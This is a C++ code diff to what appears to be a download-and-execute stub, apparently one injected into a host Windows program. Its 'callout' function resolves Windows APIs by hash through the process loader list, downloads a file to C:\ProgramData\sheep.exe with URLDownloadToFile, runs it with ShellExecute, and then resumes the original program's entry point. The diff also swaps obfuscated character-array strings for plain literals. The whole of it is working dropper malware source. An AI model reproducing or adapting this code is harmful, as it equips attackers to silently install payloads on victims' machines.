@@ -73,9 +73,6 @@ std::uint32_t fnv321a(const char *string)
 {
    std::uint32_t hashval = 0x811c9dc5;
 
-   if (string == nullptr)
-      return hashval;
-
    while (*string != 0)
    {
       hashval ^= *string++;
@@ -365,14 +362,12 @@ int callout(void)
    PFULL_LDR_DATA_TABLE_ENTRY kernel32 = reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(reinterpret_cast<PFULL_LDR_DATA_TABLE_ENTRY>(list_entry->InLoadOrderLinks.Flink)->InLoadOrderLinks.Flink);
    LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
    GetFileAttributesAHeader getFileAttributes = reinterpret_cast<GetFileAttributesAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xda1a7563));
-   char urlmonDll[] = {'u','r','l','m','o','n','.','d','l','l',0};
-   PIMAGE_DOS_HEADER urlmonModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(urlmonDll));
+   PIMAGE_DOS_HEADER urlmonModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary("urlmon.dll"));
    URLDownloadToFileHeader urlDownloadToFile = reinterpret_cast<URLDownloadToFileHeader>(get_proc_by_hash(urlmonModule, 0xd8d746fc));
-   char shell32Dll[] = {'s','h','e','l','l','3','2','.','d','l','l',0};
-   PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(shell32Dll));
+   PIMAGE_DOS_HEADER shell32Module = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary("shell32.dll"));
    ShellExecuteAHeader shellExecute = reinterpret_cast<ShellExecuteAHeader>(get_proc_by_hash(shell32Module, 0xb0ff5bf));
 
-   char sheep[] = {'C',':','\\','P','r','o','g','r','a','m','D','a','t','a','\\','s','h','e','e','p','.','e','x','e',0};
+   char sheep[] = "C:\\ProgramData\\sheep.exe";
    
    if (getFileAttributes(sheep) == INVALID_FILE_ATTRIBUTES)
    {
@@ -381,12 +376,15 @@ int callout(void)
                             sheep,
                             0,
                             nullptr) != 0)
-         return 2;
+         goto resume_executable;
    }
 
    if (reinterpret_cast<INT_PTR>(shellExecute(nullptr, nullptr, sheep, nullptr, nullptr, 1)) <= 32)
-      return 3;
-   
+      goto resume_executable;
+
+   /* TODO popad */
+resume_executable:
+   entrypoint();
    return 0;
 }
 
